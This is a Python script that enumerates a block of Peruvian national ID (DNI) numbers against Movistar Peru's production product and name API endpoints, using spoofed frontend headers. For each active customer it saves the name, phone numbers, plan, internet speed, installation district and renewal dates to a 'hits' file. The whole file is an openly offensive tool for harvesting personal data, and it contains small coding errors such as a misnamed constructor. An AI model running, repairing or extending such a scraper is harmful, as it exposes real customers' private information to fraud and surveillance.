import datetime as hourSystem
import requests as attack
from pwn import *
import threading

class MiMovistar :
    def _init_(self, dni):
        self.url = 'https://ms-product-prod.mimovistar.com.pe/product/v1/retrieveProducts'
        self.searchName = 'https://ms-common-prod.mimovistar.com.pe/commonProduct/v1/name'
        self.headersURL = {'unica-application':'frontend','unica-pid':'550e8400-e29b-41d4-a716-446655440000','unica-serviceid':'550e8400-e29b-41d4-a716-446655440000','unica-user':'user'}
        self.date = hourSystem.datetime.today().strftime('%d-%m-%Y')
        self.hour = hourSystem.datetime.today().strftime('%H:%M:%S')
        self.bot = attack.session()
        self.message = log
        self.dni = dni

    def verifyDocument(self):
        products =  self.bot.post(self.url, headers=self.bot.headers.update(self.headersURL), json={"documentType": "DNI","documentNumber": f"{self.dni}"})

        if products.status_code != 200:
            pass
        elif products.status_code == 200:
            return products.json()
        else:
            self.message.failure("El servidor se encuentra saturado, intentar mas tarde.")
            exit()

    def saveData(self):
        data_json = self.verifyDocument()
        if data_json is None:
            self.message.warning(f"El cliente {self.dni}, no existe en la BD de Movistar.")
        else:
            if len(data_json['mt']) != 0:
                sN = self.bot.post(self.searchName, json={"documentType": "DNI","documentNumber": f"{self.dni}"})
                mt = data_json['mt'][0]
                if data_json['status'] == 'active':
                    contentFile = f"**** Datos Obtenidos - {self.dni} ****\nTitular {sN.json()['name']}\nDocumento : {self.dni}\nTelefono : {mt['identifier'][1:]}\nPaquete : {mt['productInfo'][0]['productName']}\n******* Internet Contratado *****\nVelocidad : {mt['internetSpeed']}Mb\nLugar de instalacion : {mt['department']}/{mt['province']}/{mt['district']}\n****** Lista de celulares *******\nCelular : {mt['phonesList'][0]['identifier']}\nPlan : {mt['phonesList'][0]['selectorName']}\nEstado : {mt['phonesList'][0]['status']}\nFechaRenueva : {mt['phonesList'][0]['renovationDate']}\n\n"
                    self.message.success(contentFile)
                    fileData =  open(f"hitsMM_{self.date}.txt","a+")
                    fileData.write(contentFile)
                else:
                    self.message.failure(f"El cliente {self.dni}, no esta al dia en sus pagos.")
            else:
                self.message.warn(f"El cliente {self.dni}, no cuenta con servicios en Movistar.")

if __name__ == '__main__':
    threads_arr = []
    for i in range(42560000,42569999):
        t = threading.Thread(target=MiMovistar(i).saveData(),args=(5,))
        threads_arr.append(t)
        t.daemon = True
        t.start()
    
    for thr in threads_arr:
        thr.join()